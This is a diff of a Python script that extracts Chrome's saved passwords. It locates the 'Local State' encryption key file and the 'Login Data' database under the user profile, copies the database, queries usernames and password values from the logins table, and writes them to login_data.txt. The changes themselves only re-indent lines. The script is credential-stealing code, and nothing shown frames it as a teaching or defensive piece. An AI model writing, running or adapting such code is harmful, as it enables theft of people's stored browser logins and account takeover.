@@ -13,8 +13,8 @@ def main():
 	key = get_encryption_key()
 	# local sqlite Chrome database path
 	db_path = os.path.join(os.environ["USERPROFILE"], "AppData",
-							"Local", "Google", "Chrome", "User Data",
-							"default", "Login Data")
+		"Local", "Google", "Chrome", "User Data",
+		"default", "Login Data")
 	# copy the file to another location
 	# as the database will be locked if chrome is currently running
 	filename = "ChromeData.db"
@@ -24,9 +24,9 @@ def main():
 	cursor = db.cursor()
 	# 'logins' table has the data we need
 	cursor.execute("""select origin_url, action_url, username_value, 
-					password_value, date_created, date_last_used 
-					from logins 
-					order by date_created""")
+		password_value, date_created, date_last_used 
+		from logins 
+		order by date_created""")
 
 	# print the texts at the beginning of the file named "login_data.txt"
 	sourceFile = open("login_data.txt", 'a')
@@ -83,9 +83,8 @@ def get_chrome_datetime(chromedate):
 
 def get_encryption_key():
 	local_state_path = os.path.join(os.environ["USERPROFILE"],
-									"AppData", "Local", "Google",
-									"Chrome", "User Data",
-									"Local State")
+		"AppData", "Local", "Google", "Chrome",
+		"User Data", "Local State")
 	with open(local_state_path, "r", encoding="utf-8") as f:
 		local_state = f.read()
 		local_state = json.loads(local_state)
